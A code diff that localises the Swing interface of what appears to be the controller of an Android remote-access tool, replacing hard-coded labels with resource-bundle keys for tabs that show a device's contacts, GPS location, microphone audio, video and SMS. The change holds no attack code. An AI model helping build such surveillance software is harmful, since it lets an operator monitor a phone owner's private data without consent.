@@ -394,7 +394,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	private void fireButtonContacts() {
 		if(contactPanel == null) {
 			contactPanel = new ContactPanel(this);
-			tabbedPane.addTab("Contacts", contactPanel);
+			tabbedPane.addTab(BUNDLE.getString("Contacts-tab"), contactPanel);
 		}
 		tabbedPane.setSelectedComponent(contactPanel);
 	}
@@ -402,7 +402,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	private void fireButtonStreamingGPS() {
 		if(mapPanel == null) {
 			mapPanel = new MapPanel(this);
-			tabbedPane.addTab("Map viewer", mapPanel);
+			tabbedPane.addTab(BUNDLE.getString("Map-viewer-tab"), mapPanel);
 		}
 		tabbedPane.setSelectedComponent(mapPanel);
 	}
@@ -410,7 +410,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	private void fireButtonStreamingSound() {
 		if(soundPanel == null) {
 			soundPanel = new SoundPanel(this);
-			tabbedPane.addTab("Sound listener", soundPanel);
+			tabbedPane.addTab(BUNDLE.getString("Sound-listener"), soundPanel);
 		}
 		tabbedPane.setSelectedComponent(soundPanel);
 	}
@@ -418,7 +418,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	private void fireButtonStreamingVideo() {
 		if(videoPanel == null) {
 			videoPanel = new VideoPanel(this);
-			tabbedPane.addTab("Video player", videoPanel);
+			tabbedPane.addTab(BUNDLE.getString("Video player"), videoPanel);
 		}
 		tabbedPane.setSelectedComponent(videoPanel);
 	}
@@ -426,13 +426,13 @@ public class UserGUI extends JFrame implements WindowListener {
 	private void fireButtonSMS() {
 		if(smsPanel == null) {
 			smsPanel = new SMSLogPanel(this);
-			tabbedPane.addTab("SMS viewer", smsPanel);
+			tabbedPane.addTab(BUNDLE.getString("SMS viewer"), smsPanel);
 		}
 		tabbedPane.setSelectedComponent(smsPanel);
 	}
 	
 	private void fireButtonToastMessage() {
-		String txt = JOptionPane.showInputDialog(this, "Enter your text :");
+		String txt = JOptionPane.showInputDialog(this, BUNDLE.getString("send-toast-title"));
 		gui.fireToastMessage(imei, txt);
 	}
 	
@@ -444,7 +444,7 @@ public class UserGUI extends JFrame implements WindowListener {
 	public void fireButtonCloseTab() {
 		JPanel panel = (JPanel) tabbedPane.getSelectedComponent();
 		if(panel == homePanel) {
-			JOptionPane.showMessageDialog(this,"You can't close the home tab !","Forbiden action",JOptionPane.ERROR_MESSAGE);
+			JOptionPane.showMessageDialog(this,BUNDLE.getString("colse-home-title"),BUNDLE.getString("Forbidden-action"),JOptionPane.ERROR_MESSAGE);
 		} else {
 			this.removeTab(panel);
 		}
